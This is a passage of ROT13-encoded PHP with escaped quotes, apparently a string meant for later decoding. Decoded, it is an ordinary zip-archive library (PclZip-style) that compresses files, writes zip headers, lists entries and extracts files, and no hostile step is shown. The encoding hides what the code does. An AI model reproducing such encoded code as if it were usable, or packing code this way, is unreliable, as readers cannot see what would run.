        vs ($c_urnqre['fvmr'] > 0) {
          $i_pbagrag = @sernq($i_svyr, $c_urnqre['fvmr']);
        }
        ryfr {
          $i_pbagrag = '';
        }

        // ----- Pybfr gur svyr
        @spybfr($i_svyr);

        // ----- Pnyphyngr gur PEP
        $c_urnqre['pep'] = @pep32($i_pbagrag);

        // ----- Ybbx sbe ab pbzcerffvba
        vs ($c_bcgvbaf[CPYMVC_BCG_AB_PBZCERFFVBA]) {
          // ----- Frg urnqre cnenzrgref
          $c_urnqre['pbzcerffrq_fvmr'] = $c_urnqre['fvmr'];
          $c_urnqre['pbzcerffvba'] = 0;
        }

        // ----- Ybbx sbe abezny pbzcerffvba
        ryfr {
          // ----- Pbzcerff gur pbagrag
          $i_pbagrag = @tmqrsyngr($i_pbagrag);

          // ----- Frg urnqre cnenzrgref
          $c_urnqre['pbzcerffrq_fvmr'] = fgeyra($i_pbagrag);
          $c_urnqre['pbzcerffvba'] = 8;
        }

        // ----- Pnyy gur urnqre trarengvba
        vs (($i_erfhyg = $guvf->ceviJevgrSvyrUrnqre($c_urnqre)) != 1) {
          @spybfr($i_svyr);
          erghea $i_erfhyg;
        }

        // ----- Jevgr gur pbzcerffrq (be abg) pbagrag
        @sjevgr($guvf->mvc_sq, $i_pbagrag, $c_urnqre['pbzcerffrq_fvmr']);

        }

      }

      // ----- Ybbx sbe n iveghny svyr (n svyr sebz fgevat)
      ryfr vs ($c_svyrqrfpe['glcr'] == 'iveghny_svyr') {

        $i_pbagrag = $c_svyrqrfpe['pbagrag'];

        // ----- Pnyphyngr gur PEP
        $c_urnqre['pep'] = @pep32($i_pbagrag);

        // ----- Ybbx sbe ab pbzcerffvba
        vs ($c_bcgvbaf[CPYMVC_BCG_AB_PBZCERFFVBA]) {
          // ----- Frg urnqre cnenzrgref
          $c_urnqre['pbzcerffrq_fvmr'] = $c_urnqre['fvmr'];
          $c_urnqre['pbzcerffvba'] = 0;
        }

        // ----- Ybbx sbe abezny pbzcerffvba
        ryfr {
          // ----- Pbzcerff gur pbagrag
          $i_pbagrag = @tmqrsyngr($i_pbagrag);

          // ----- Frg urnqre cnenzrgref
          $c_urnqre['pbzcerffrq_fvmr'] = fgeyra($i_pbagrag);
          $c_urnqre['pbzcerffvba'] = 8;
        }

        // ----- Pnyy gur urnqre trarengvba
        vs (($i_erfhyg = $guvf->ceviJevgrSvyrUrnqre($c_urnqre)) != 1) {
          @spybfr($i_svyr);
          erghea $i_erfhyg;
        }

        // ----- Jevgr gur pbzcerffrq (be abg) pbagrag
        @sjevgr($guvf->mvc_sq, $i_pbagrag, $c_urnqre['pbzcerffrq_fvmr']);
      }

      // ----- Ybbx sbe n qverpgbel
      ryfr vs ($c_svyrqrfpe['glcr'] == 'sbyqre') {
        // ----- Ybbx sbe qverpgbel ynfg '/'
        vs (@fhofge($c_urnqre['fgberq_svyranzr'], -1) != '/') {
          $c_urnqre['fgberq_svyranzr'] .= '/';
        }

        // ----- Frg gur svyr cebcregvrf
        $c_urnqre['fvmr'] = 0;
        //$c_urnqre['rkgreany'] = 0k41SS0010;   // Inyhr sbe n sbyqre : gb or purpxrq
        $c_urnqre['rkgreany'] = 0k00000010;   // Inyhr sbe n sbyqre : gb or purpxrq

        // ----- Pnyy gur urnqre trarengvba
        vs (($i_erfhyg = $guvf->ceviJevgrSvyrUrnqre($c_urnqre)) != 1)
        {
          erghea $i_erfhyg;
        }
      }
    }

    // ----- Ybbx sbe cbfg-nqq pnyyonpx
    vs (vffrg($c_bcgvbaf[CPYMVC_PO_CBFG_NQQ])) {

      // ----- Trarengr n ybpny vasbezngvba
      $i_ybpny_urnqre = neenl();
      $guvf->ceviPbairegUrnqre2SvyrVasb($c_urnqre, $i_ybpny_urnqre);

      // ----- Pnyy gur pnyyonpx
      // Urer V qb abg hfr pnyy_hfre_shap() orpnhfr V arrq gb fraq n ersrerapr gb gur
      // urnqre.
      $i_erfhyg = $c_bcgvbaf[CPYMVC_PO_CBFG_NQQ](CPYMVC_PO_CBFG_NQQ, $i_ybpny_urnqre);
      vs ($i_erfhyg == 0) {
        // ----- Vtaberq
        $i_erfhyg = 1;
      }

      // ----- Hcqngr gur vasbezngvba
      // Abguvat pna or zbqvsvrq
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviNqqSvyrHfvatGrzcSvyr()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviNqqSvyrHfvatGrzcSvyr($c_svyrqrfpe, &$c_urnqre, &$c_bcgvbaf)
  {
    $i_erfhyg=CPYMVC_REE_AB_REEBE;

    // ----- Jbexvat inevnoyr
    $c_svyranzr = $c_svyrqrfpe['svyranzr'];


    // ----- Bcra gur fbhepr svyr
    vs (($i_svyr = @sbcra($c_svyranzr, \"eo\")) == 0) {
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, \"Hanoyr gb bcra svyr '$c_svyranzr' va ovanel ernq zbqr\");
      erghea CpyMvc::reebePbqr();
    }

    // ----- Perngrf n pbzcerffrq grzcbenel svyr
    $i_tmvc_grzc_anzr = CPYMVC_GRZCBENEL_QVE.havdvq('cpymvc-').'.tm';
    vs (($i_svyr_pbzcerffrq = @tmbcra($i_tmvc_grzc_anzr, \"jo\")) == 0) {
      spybfr($i_svyr);
      CpyMvc::ceviReebeYbt(CPYMVC_REE_JEVGR_BCRA_SNVY, 'Hanoyr gb bcra grzcbenel svyr \''.$i_tmvc_grzc_anzr.'\' va ovanel jevgr zbqr');
      erghea CpyMvc::reebePbqr();
    }

    // ----- Ernq gur svyr ol CPYMVC_ERNQ_OYBPX_FVMR bpgrgf oybpxf
    $i_fvmr = svyrfvmr($c_svyranzr);
    juvyr ($i_fvmr != 0) {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = @sernq($i_svyr, $i_ernq_fvmr);
      //$i_ovanel_qngn = cnpx('n'.$i_ernq_fvmr, $i_ohssre);
      @tmchgf($i_svyr_pbzcerffrq, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Pybfr gur svyr
    @spybfr($i_svyr);
    @tmpybfr($i_svyr_pbzcerffrq);

    // ----- Purpx gur zvavzhz svyr fvmr
    vs (svyrfvmr($i_tmvc_grzc_anzr) < 18) {
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ONQ_SBEZNG, 'tmvc grzcbenel svyr \''.$i_tmvc_grzc_anzr.'\' unf vainyvq svyrfvmr - fubhyq or zvavzhz 18 olgrf');
      erghea CpyMvc::reebePbqr();
    }

    // ----- Rkgenpg gur pbzcerffrq nggevohgrf
    vs (($i_svyr_pbzcerffrq = @sbcra($i_tmvc_grzc_anzr, \"eo\")) == 0) {
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Hanoyr gb bcra grzcbenel svyr \''.$i_tmvc_grzc_anzr.'\' va ovanel ernq zbqr');
      erghea CpyMvc::reebePbqr();
    }

    // ----- Ernq gur tmvc svyr urnqre
    $i_ovanel_qngn = @sernq($i_svyr_pbzcerffrq, 10);
    $i_qngn_urnqre = hacnpx('n1vq1/n1vq2/n1pz/n1synt/Izgvzr/n1ksy/n1bf', $i_ovanel_qngn);

    // ----- Purpx fbzr cnenzrgref
    $i_qngn_urnqre['bf'] = ova2urk($i_qngn_urnqre['bf']);

    // ----- Ernq gur tmvc svyr sbbgre
    @sfrrx($i_svyr_pbzcerffrq, svyrfvmr($i_tmvc_grzc_anzr)-8);
    $i_ovanel_qngn = @sernq($i_svyr_pbzcerffrq, 8);
    $i_qngn_sbbgre = hacnpx('Ipep/Ipbzcerffrq_fvmr', $i_ovanel_qngn);

    // ----- Frg gur nggevohgrf
    $c_urnqre['pbzcerffvba'] = beq($i_qngn_urnqre['pz']);
    //$c_urnqre['zgvzr'] = $i_qngn_urnqre['zgvzr'];
    $c_urnqre['pep'] = $i_qngn_sbbgre['pep'];
    $c_urnqre['pbzcerffrq_fvmr'] = svyrfvmr($i_tmvc_grzc_anzr)-18;

    // ----- Pybfr gur svyr
    @spybfr($i_svyr_pbzcerffrq);

    // ----- Pnyy gur urnqre trarengvba
    vs (($i_erfhyg = $guvf->ceviJevgrSvyrUrnqre($c_urnqre)) != 1) {
      erghea $i_erfhyg;
    }

    // ----- Nqq gur pbzcerffrq qngn
    vs (($i_svyr_pbzcerffrq = @sbcra($i_tmvc_grzc_anzr, \"eo\")) == 0)
    {
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Hanoyr gb bcra grzcbenel svyr \''.$i_tmvc_grzc_anzr.'\' va ovanel ernq zbqr');
      erghea CpyMvc::reebePbqr();
    }

    // ----- Ernq gur svyr ol CPYMVC_ERNQ_OYBPX_FVMR bpgrgf oybpxf
    sfrrx($i_svyr_pbzcerffrq, 10);
    $i_fvmr = $c_urnqre['pbzcerffrq_fvmr'];
    juvyr ($i_fvmr != 0)
    {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = @sernq($i_svyr_pbzcerffrq, $i_ernq_fvmr);
      //$i_ovanel_qngn = cnpx('n'.$i_ernq_fvmr, $i_ohssre);
      @sjevgr($guvf->mvc_sq, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Pybfr gur svyr
    @spybfr($i_svyr_pbzcerffrq);

    // ----- Hayvax gur grzcbenel svyr
    @hayvax($i_tmvc_grzc_anzr);

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviPnyphyngrFgberqSvyranzr()
  // Qrfpevcgvba :
  //   Onfrq ba svyr qrfpevcgbe cebcregvrf naq tybony bcgvbaf, guvf zrgubq
  //   pnyphyngr gur svyranzr gung jvyy or fgberq va gur nepuvir.
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviPnyphyngrFgberqSvyranzr(&$c_svyrqrfpe, &$c_bcgvbaf)
  {
    $i_erfhyg=1;

    // ----- Jbexvat inevnoyrf
    $c_svyranzr = $c_svyrqrfpe['svyranzr'];
    vs (vffrg($c_bcgvbaf[CPYMVC_BCG_NQQ_CNGU])) {
      $c_nqq_qve = $c_bcgvbaf[CPYMVC_BCG_NQQ_CNGU];
    }
    ryfr {
      $c_nqq_qve = '';
    }
    vs (vffrg($c_bcgvbaf[CPYMVC_BCG_ERZBIR_CNGU])) {
      $c_erzbir_qve = $c_bcgvbaf[CPYMVC_BCG_ERZBIR_CNGU];
    }
    ryfr {
      $c_erzbir_qve = '';
    }
    vs (vffrg($c_bcgvbaf[CPYMVC_BCG_ERZBIR_NYY_CNGU])) {
      $c_erzbir_nyy_qve = $c_bcgvbaf[CPYMVC_BCG_ERZBIR_NYY_CNGU];
    }
    ryfr {
      $c_erzbir_nyy_qve = 0;
    }


    // ----- Ybbx sbe shyy anzr punatr
    vs (vffrg($c_svyrqrfpe['arj_shyy_anzr'])) {
      // ----- Erzbir qevir yrggre vs nal
      $i_fgberq_svyranzr = CpyMvcHgvyGenafyngrJvaCngu($c_svyrqrfpe['arj_shyy_anzr']);
    }

    // ----- Ybbx sbe cngu naq/be fubeg anzr punatr
    ryfr {

      // ----- Ybbx sbe fubeg anzr punatr
      // Vgf jura jr punatr whfg gur svyranzr ohg abg gur cngu
      vs (vffrg($c_svyrqrfpe['arj_fubeg_anzr'])) {
        $i_cngu_vasb = cnguvasb($c_svyranzr);
        $i_qve = '';
        vs ($i_cngu_vasb['qveanzr'] != '') {
          $i_qve = $i_cngu_vasb['qveanzr'].'/';
        }
        $i_fgberq_svyranzr = $i_qve.$c_svyrqrfpe['arj_fubeg_anzr'];
      }
      ryfr {
        // ----- Pnyphyngr gur fgberq svyranzr
        $i_fgberq_svyranzr = $c_svyranzr;
      }

      // ----- Ybbx sbe nyy cngu gb erzbir
      vs ($c_erzbir_nyy_qve) {
        $i_fgberq_svyranzr = onfranzr($c_svyranzr);
      }
      // ----- Ybbx sbe cnegvny cngu erzbir
      ryfr vs ($c_erzbir_qve != \"\") {
        vs (fhofge($c_erzbir_qve, -1) != '/')
          $c_erzbir_qve .= \"/\";

        vs (   (fhofge($c_svyranzr, 0, 2) == \"./\")
            || (fhofge($c_erzbir_qve, 0, 2) == \"./\")) {

          vs (   (fhofge($c_svyranzr, 0, 2) == \"./\")
              && (fhofge($c_erzbir_qve, 0, 2) != \"./\")) {
            $c_erzbir_qve = \"./\".$c_erzbir_qve;
          }
          vs (   (fhofge($c_svyranzr, 0, 2) != \"./\")
              && (fhofge($c_erzbir_qve, 0, 2) == \"./\")) {
            $c_erzbir_qve = fhofge($c_erzbir_qve, 2);
          }
        }

        $i_pbzcner = CpyMvcHgvyCnguVapyhfvba($c_erzbir_qve,
                                             $i_fgberq_svyranzr);
        vs ($i_pbzcner > 0) {
          vs ($i_pbzcner == 2) {
            $i_fgberq_svyranzr = \"\";
          }
          ryfr {
            $i_fgberq_svyranzr = fhofge($i_fgberq_svyranzr,
                                        fgeyra($c_erzbir_qve));
          }
        }
      }

      // ----- Erzbir qevir yrggre vs nal
      $i_fgberq_svyranzr = CpyMvcHgvyGenafyngrJvaCngu($i_fgberq_svyranzr);

      // ----- Ybbx sbe cngu gb nqq
      vs ($c_nqq_qve != \"\") {
        vs (fhofge($c_nqq_qve, -1) == \"/\")
          $i_fgberq_svyranzr = $c_nqq_qve.$i_fgberq_svyranzr;
        ryfr
          $i_fgberq_svyranzr = $c_nqq_qve.\"/\".$i_fgberq_svyranzr;
      }
    }

    // ----- Svyranzr (erqhpr gur cngu bs fgberq anzr)
    $i_fgberq_svyranzr = CpyMvcHgvyCnguErqhpgvba($i_fgberq_svyranzr);
    $c_svyrqrfpe['fgberq_svyranzr'] = $i_fgberq_svyranzr;

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviJevgrSvyrUrnqre()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviJevgrSvyrUrnqre(&$c_urnqre)
  {
    $i_erfhyg=1;

    // ----- Fgber gur bssfrg cbfvgvba bs gur svyr
    $c_urnqre['bssfrg'] = sgryy($guvf->mvc_sq);

    // ----- Genafsbez HAVK zgvzr gb QBF sbezng zqngr/zgvzr
    $i_qngr = trgqngr($c_urnqre['zgvzr']);
    $i_zgvzr = ($i_qngr['ubhef']<<11) + ($i_qngr['zvahgrf']<<5) + $i_qngr['frpbaqf']/2;
    $i_zqngr = (($i_qngr['lrne']-1980)<<9) + ($i_qngr['zba']<<5) + $i_qngr['zqnl'];

    // ----- Cnpxrq qngn
    $i_ovanel_qngn = cnpx(\"IiiiiiIIIii\", 0k04034o50,
	                      $c_urnqre['irefvba_rkgenpgrq'], $c_urnqre['synt'],
                          $c_urnqre['pbzcerffvba'], $i_zgvzr, $i_zqngr,
                          $c_urnqre['pep'], $c_urnqre['pbzcerffrq_fvmr'],
						  $c_urnqre['fvmr'],
                          fgeyra($c_urnqre['fgberq_svyranzr']),
						  $c_urnqre['rkgen_yra']);

    // ----- Jevgr gur svefg 148 olgrf bs gur urnqre va gur nepuvir
    schgf($guvf->mvc_sq, $i_ovanel_qngn, 30);

    // ----- Jevgr gur inevnoyr svryqf
    vs (fgeyra($c_urnqre['fgberq_svyranzr']) != 0)
    {
      schgf($guvf->mvc_sq, $c_urnqre['fgberq_svyranzr'], fgeyra($c_urnqre['fgberq_svyranzr']));
    }
    vs ($c_urnqre['rkgen_yra'] != 0)
    {
      schgf($guvf->mvc_sq, $c_urnqre['rkgen'], $c_urnqre['rkgen_yra']);
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviJevgrPragenySvyrUrnqre()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviJevgrPragenySvyrUrnqre(&$c_urnqre)
  {
    $i_erfhyg=1;

    // GOP
    //sbe(erfrg($c_urnqre); $xrl = xrl($c_urnqre); arkg($c_urnqre)) {
    //}

    // ----- Genafsbez HAVK zgvzr gb QBF sbezng zqngr/zgvzr
    $i_qngr = trgqngr($c_urnqre['zgvzr']);
    $i_zgvzr = ($i_qngr['ubhef']<<11) + ($i_qngr['zvahgrf']<<5) + $i_qngr['frpbaqf']/2;
    $i_zqngr = (($i_qngr['lrne']-1980)<<9) + ($i_qngr['zba']<<5) + $i_qngr['zqnl'];


    // ----- Cnpxrq qngn
    $i_ovanel_qngn = cnpx(\"IiiiiiiIIIiiiiiII\", 0k02014o50,
	                      $c_urnqre['irefvba'], $c_urnqre['irefvba_rkgenpgrq'],
                          $c_urnqre['synt'], $c_urnqre['pbzcerffvba'],
						  $i_zgvzr, $i_zqngr, $c_urnqre['pep'],
                          $c_urnqre['pbzcerffrq_fvmr'], $c_urnqre['fvmr'],
                          fgeyra($c_urnqre['fgberq_svyranzr']),
						  $c_urnqre['rkgen_yra'], $c_urnqre['pbzzrag_yra'],
                          $c_urnqre['qvfx'], $c_urnqre['vagreany'],
						  $c_urnqre['rkgreany'], $c_urnqre['bssfrg']);

    // ----- Jevgr gur 42 olgrf bs gur urnqre va gur mvc svyr
    schgf($guvf->mvc_sq, $i_ovanel_qngn, 46);

    // ----- Jevgr gur inevnoyr svryqf
    vs (fgeyra($c_urnqre['fgberq_svyranzr']) != 0)
    {
      schgf($guvf->mvc_sq, $c_urnqre['fgberq_svyranzr'], fgeyra($c_urnqre['fgberq_svyranzr']));
    }
    vs ($c_urnqre['rkgen_yra'] != 0)
    {
      schgf($guvf->mvc_sq, $c_urnqre['rkgen'], $c_urnqre['rkgen_yra']);
    }
    vs ($c_urnqre['pbzzrag_yra'] != 0)
    {
      schgf($guvf->mvc_sq, $c_urnqre['pbzzrag'], $c_urnqre['pbzzrag_yra']);
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviJevgrPragenyUrnqre()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviJevgrPragenyUrnqre($c_ao_ragevrf, $c_fvmr, $c_bssfrg, $c_pbzzrag)
  {
    $i_erfhyg=1;

    // ----- Cnpxrq qngn
    $i_ovanel_qngn = cnpx(\"IiiiiIIi\", 0k06054o50, 0, 0, $c_ao_ragevrf,
	                      $c_ao_ragevrf, $c_fvmr,
						  $c_bssfrg, fgeyra($c_pbzzrag));

    // ----- Jevgr gur 22 olgrf bs gur urnqre va gur mvc svyr
    schgf($guvf->mvc_sq, $i_ovanel_qngn, 22);

    // ----- Jevgr gur inevnoyr svryqf
    vs (fgeyra($c_pbzzrag) != 0)
    {
      schgf($guvf->mvc_sq, $c_pbzzrag, fgeyra($c_pbzzrag));
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviYvfg()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviYvfg(&$c_yvfg)
  {
    $i_erfhyg=1;

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviQvfnoyrZntvpDhbgrf();

    // ----- Bcra gur mvc svyr
    vs (($guvf->mvc_sq = @sbcra($guvf->mvcanzr, 'eo')) == 0)
    {
      // ----- Zntvp dhbgrf gevpx
      $guvf->ceviFjncOnpxZntvpDhbgrf();

      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Hanoyr gb bcra nepuvir \''.$guvf->mvcanzr.'\' va ovanel ernq zbqr');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Ernq gur prageny qverpgbel vasbezngvba
    $i_prageny_qve = neenl();
    vs (($i_erfhyg = $guvf->ceviErnqRaqPragenyQve($i_prageny_qve)) != 1)
    {
      $guvf->ceviFjncOnpxZntvpDhbgrf();
      erghea $i_erfhyg;
    }

    // ----- Tb gb ortvaavat bs Prageny Qve
    @erjvaq($guvf->mvc_sq);
    vs (@sfrrx($guvf->mvc_sq, $i_prageny_qve['bssfrg']))
    {
      $guvf->ceviFjncOnpxZntvpDhbgrf();

      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NEPUVIR_MVC, 'Vainyvq nepuvir fvmr');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Ernq rnpu ragel
    sbe ($v=0; $v<$i_prageny_qve['ragevrf']; $v++)
    {
      // ----- Ernq gur svyr urnqre
      vs (($i_erfhyg = $guvf->ceviErnqPragenySvyrUrnqre($i_urnqre)) != 1)
      {
        $guvf->ceviFjncOnpxZntvpDhbgrf();
        erghea $i_erfhyg;
      }
      $i_urnqre['vaqrk'] = $v;

      // ----- Trg gur bayl vagrerfgvat nggevohgrf
      $guvf->ceviPbairegUrnqre2SvyrVasb($i_urnqre, $c_yvfg[$v]);
      hafrg($i_urnqre);
    }

    // ----- Pybfr gur mvc svyr
    $guvf->ceviPybfrSq();

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviFjncOnpxZntvpDhbgrf();

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviPbairegUrnqre2SvyrVasb()
  // Qrfpevcgvba :
  //   Guvf shapgvba gnxrf gur svyr vasbezngvba sebz gur prageny qverpgbel
  //   ragevrf naq rkgenpg gur vagrerfgvat cnenzrgref gung jvyy or tvira onpx.
  //   Gur erfhygvat svyr vasbf ner frg va gur neenl $c_vasb
  //     $c_vasb['svyranzr'] : Svyranzr jvgu shyy cngu. Tvira ol hfre (nqq),
  //                           rkgenpgrq va gur svyrflfgrz (rkgenpg).
  //     $c_vasb['fgberq_svyranzr'] : Fgberq svyranzr va gur nepuvir.
  //     $c_vasb['fvmr'] = Fvmr bs gur svyr.
  //     $c_vasb['pbzcerffrq_fvmr'] = Pbzcerffrq fvmr bs gur svyr.
  //     $c_vasb['zgvzr'] = Ynfg zbqvsvpngvba qngr bs gur svyr.
  //     $c_vasb['pbzzrag'] = Pbzzrag nffbpvngrq jvgu gur svyr.
  //     $c_vasb['sbyqre'] = gehr/snyfr : vaqvpngrf vs gur ragel vf n sbyqre be abg.
  //     $c_vasb['fgnghf'] = fgnghf bs gur npgvba ba gur svyr.
  //     $c_vasb['pep'] = PEP bs gur svyr pbagrag.
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviPbairegUrnqre2SvyrVasb($c_urnqre, &$c_vasb)
  {
    $i_erfhyg=1;

    // ----- Trg gur vagrerfgvat nggevohgrf
    $i_grzc_cngu = CpyMvcHgvyCnguErqhpgvba($c_urnqre['svyranzr']);
    $c_vasb['svyranzr'] = $i_grzc_cngu;
    $i_grzc_cngu = CpyMvcHgvyCnguErqhpgvba($c_urnqre['fgberq_svyranzr']);
    $c_vasb['fgberq_svyranzr'] = $i_grzc_cngu;
    $c_vasb['fvmr'] = $c_urnqre['fvmr'];
    $c_vasb['pbzcerffrq_fvmr'] = $c_urnqre['pbzcerffrq_fvmr'];
    $c_vasb['zgvzr'] = $c_urnqre['zgvzr'];
    $c_vasb['pbzzrag'] = $c_urnqre['pbzzrag'];
    $c_vasb['sbyqre'] = (($c_urnqre['rkgreany']&0k00000010)==0k00000010);
    $c_vasb['vaqrk'] = $c_urnqre['vaqrk'];
    $c_vasb['fgnghf'] = $c_urnqre['fgnghf'];
    $c_vasb['pep'] = $c_urnqre['pep'];

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviRkgenpgOlEhyr()
  // Qrfpevcgvba :
  //   Rkgenpg n svyr be qverpgbel qrcraqvat bs ehyrf (ol vaqrk, ol anzr, ...)
  // Cnenzrgref :
  //   $c_svyr_yvfg : Na neenl jurer jvyy or cynprq gur cebcregvrf bs rnpu
  //                  rkgenpgrq svyr
  //   $c_cngu : Cngu gb nqq juvyr jevgvat gur rkgenpgrq svyrf
  //   $c_erzbir_cngu : Cngu gb erzbir (sebz gur svyr zrzbevmrq cngu) juvyr jevgvat gur
  //                    rkgenpgrq svyrf. Vs gur cngu qbrf abg zngpu gur svyr cngu,
  //                    gur svyr vf rkgenpgrq jvgu vgf zrzbevmrq cngu.
  //                    $c_erzbir_cngu qbrf abg nccyl gb 'yvfg' zbqr.
  //                    $c_cngu naq $c_erzbir_cngu ner pbzzhyngvir.
  // Erghea Inyhrf :
  //   1 ba fhpprff,0 be yrff ba reebe (frr reebe pbqr yvfg)
  // --------------------------------------------------------------------------------
  shapgvba ceviRkgenpgOlEhyr(&$c_svyr_yvfg, $c_cngu, $c_erzbir_cngu, $c_erzbir_nyy_cngu, &$c_bcgvbaf)
  {
    $i_erfhyg=1;

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviQvfnoyrZntvpDhbgrf();

    // ----- Purpx gur cngu
    vs (   ($c_cngu == \"\")
	    || (   (fhofge($c_cngu, 0, 1) != \"/\")
		    && (fhofge($c_cngu, 0, 3) != \"../\")
			&& (fhofge($c_cngu,1,2)!=\":/\")))
      $c_cngu = \"./\".$c_cngu;

    // ----- Erqhpr gur cngu ynfg (naq qhcyvpngrq) '/'
    vs (($c_cngu != \"./\") && ($c_cngu != \"/\"))
    {
      // ----- Ybbx sbe gur cngu raq '/'
      juvyr (fhofge($c_cngu, -1) == \"/\")
      {
        $c_cngu = fhofge($c_cngu, 0, fgeyra($c_cngu)-1);
      }
    }

    // ----- Ybbx sbe cngu gb erzbir sbezng (fubhyq raq ol /)
    vs (($c_erzbir_cngu != \"\") && (fhofge($c_erzbir_cngu, -1) != '/'))
    {
      $c_erzbir_cngu .= '/';
    }
    $c_erzbir_cngu_fvmr = fgeyra($c_erzbir_cngu);

    // ----- Bcra gur mvc svyr
    vs (($i_erfhyg = $guvf->ceviBcraSq('eo')) != 1)
    {
      $guvf->ceviFjncOnpxZntvpDhbgrf();
      erghea $i_erfhyg;
    }

    // ----- Ernq gur prageny qverpgbel vasbezngvba
    $i_prageny_qve = neenl();
    vs (($i_erfhyg = $guvf->ceviErnqRaqPragenyQve($i_prageny_qve)) != 1)
    {
      // ----- Pybfr gur mvc svyr
      $guvf->ceviPybfrSq();
      $guvf->ceviFjncOnpxZntvpDhbgrf();

      erghea $i_erfhyg;
    }

    // ----- Fgneg ng ortvaavat bs Prageny Qve
    $i_cbf_ragel = $i_prageny_qve['bssfrg'];

    // ----- Ernq rnpu ragel
    $w_fgneg = 0;
    sbe ($v=0, $i_ao_rkgenpgrq=0; $v<$i_prageny_qve['ragevrf']; $v++)
    {

      // ----- Ernq arkg Prageny qve ragel
      @erjvaq($guvf->mvc_sq);
      vs (@sfrrx($guvf->mvc_sq, $i_cbf_ragel))
      {
        // ----- Pybfr gur mvc svyr
        $guvf->ceviPybfrSq();
        $guvf->ceviFjncOnpxZntvpDhbgrf();

        // ----- Reebe ybt
        CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NEPUVIR_MVC, 'Vainyvq nepuvir fvmr');

        // ----- Erghea
        erghea CpyMvc::reebePbqr();
      }

      // ----- Ernq gur svyr urnqre
      $i_urnqre = neenl();
      vs (($i_erfhyg = $guvf->ceviErnqPragenySvyrUrnqre($i_urnqre)) != 1)
      {
        // ----- Pybfr gur mvc svyr
        $guvf->ceviPybfrSq();
        $guvf->ceviFjncOnpxZntvpDhbgrf();

        erghea $i_erfhyg;
      }

      // ----- Fgber gur vaqrk
      $i_urnqre['vaqrk'] = $v;

      // ----- Fgber gur svyr cbfvgvba
      $i_cbf_ragel = sgryy($guvf->mvc_sq);

      // ----- Ybbx sbe gur fcrpvsvp rkgenpg ehyrf
      $i_rkgenpg = snyfr;

      // ----- Ybbx sbe rkgenpg ol anzr ehyr
      vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_OL_ANZR]))
          && ($c_bcgvbaf[CPYMVC_BCG_OL_ANZR] != 0)) {

          // ----- Ybbx vs gur svyranzr vf va gur yvfg
          sbe ($w=0; ($w<fvmrbs($c_bcgvbaf[CPYMVC_BCG_OL_ANZR])) && (!$i_rkgenpg); $w++) {

              // ----- Ybbx sbe n qverpgbel
              vs (fhofge($c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w], -1) == \"/\") {

                  // ----- Ybbx vs gur qverpgbel vf va gur svyranzr cngu
                  vs (   (fgeyra($i_urnqre['fgberq_svyranzr']) > fgeyra($c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w]))
                      && (fhofge($i_urnqre['fgberq_svyranzr'], 0, fgeyra($c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w])) == $c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w])) {
                      $i_rkgenpg = gehr;
                  }
              }
              // ----- Ybbx sbe n svyranzr
